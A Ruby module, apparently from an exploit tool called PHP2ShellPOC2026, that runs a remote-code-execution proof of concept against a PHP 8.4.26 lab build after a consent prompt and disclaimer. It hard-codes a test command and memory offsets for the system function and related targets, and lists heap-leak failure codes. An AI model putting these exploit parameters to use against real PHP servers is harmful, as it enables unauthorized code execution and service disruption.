# frozen_string_literal: true

require_relative "errors"
require_relative "i18n"
require_relative "options"
require_relative "sanitize"

module PHP2ShellPOC2026
  # Authorized proof-of-concept orchestration. The scanner decides whether a
  # host is exposed; this module is only reached after the human explicitly
  # answers yes to the post-scan question.
  #
  # The POC is calibrated for the lab/bookworm PHP 8.4.26 build. It can
  # disrupt the target (memory exhaustion and worker rotation), so the CLI
  # shows a warning before starting it.
  module Poc
    class Error < StandardError; end
    # Raised before any POC traffic when the scan options cannot be carried
    # over to the raw POC transport (proxy or credentials).
    class ConfigurationError < Error; end

    COMMAND = "id>/out/p1"
    SYSTEM_FUNCTION_OFFSET = 0x43A870
    DESTRUCTOR_OFFSET = 0x613C50
    BOOKWORM_CARRIER_OFFSET = 0x690D8

    DISCLAIMER = <<~TEXT
      Do not use this scanner or POC against military, government, critical
      infrastructure, or any system you do not own or have explicit written
      permission to test. Unauthorized access is illegal.

      This POC performs memory exhaustion and worker rotation. It may disrupt
      the target service. It is calibrated for the bookworm PHP 8.4.26 lab
      build and may fail against other builds.

      The authors and contributors are not responsible for any damage, misuse,
      or legal consequences. By proceeding, you confirm that you have
      authorization and accept full responsibility for your actions.
    TEXT

    Result = Struct.new(
      :status, :proof, :duration_ms, :attempts, :heap_anchor,
      :library_anchor, :carrier_address, :system_function, :error, :log,
      keyword_init: true
    ) do
      def confirmed?
        status == :confirmed
      end

      def failed?
        status == :failed || status == :error
      end

      def to_h
        {
          status: status,
          proof: proof,
          duration_ms: duration_ms,
          attempts: attempts,
          heap_anchor: heap_anchor,
          library_anchor: library_anchor,
          carrier_address: carrier_address,
          system_function: system_function,
          error: error,
          log: log
        }
      end
    end

    FAILURE_TEXT = {
      "HEAP_LEAK_FAILED" => "The heap leak did not return a usable anchor.",
      "LIBPHP_LEAK_FAILED" => "The library leak did not return a usable base.",
      "EXPLOIT_FAILED" => "The command was sent, but no proof appeared. It may have run without output."
    }.freeze

    module_function

    def consent(input: $stdin, out: $stdout, detected_version: nil, console: nil)
      console ||= Console.new(options: Options.new, out: out)
      I18n.with_locale(console.options.locale) do
        console.title(t("consent.title", "AUTHORIZED PENETRATION TEST"))
        if detected_version
          console.info(t("consent.detected",
                         "Detected PHP %{version}. The lab POC is calibrated for PHP 8.4.26 (bookworm).",
                         version: detected_version))
        else
          console.info(t("consent.unknown",
                         "The lab POC is calibrated for PHP 8.4.26 (bookworm); the detected version is unconfirmed."))
        end
        console.question(t("consent.prompt",
                           "This host is exposed. Proceed with the authorized penetration test? [y/N] "))
        answer = input&.gets
        out.puts
        !!(answer && answer.strip.match?(/\A(?:y|yes)\z/i))
      end
    end

    def disclaimer
      I18n.t("data.poc.disclaimer", default: DISCLAIMER)
    end

    def failure_text(code)
      key = "failure.#{code.to_s.downcase}"
      fallback = FAILURE_TEXT.fetch(code.to_s.upcase, code.to_s)
      I18n.t("data.poc.#{key}", default: fallback)
    end

    def t(key, default, **vars)
      I18n.t("data.poc.#{key}", default: default, **vars)
    end
  end
end

require_relative "poc/console"
require_relative "poc/transport"
require_relative "poc/multipart_body"
require_relative "poc/offset_table"
require_relative "poc/cookie_memory"
require_relative "poc/carrier"
require_relative "poc/proof"
require_relative "poc/runner"
require_relative "poc/presenter"
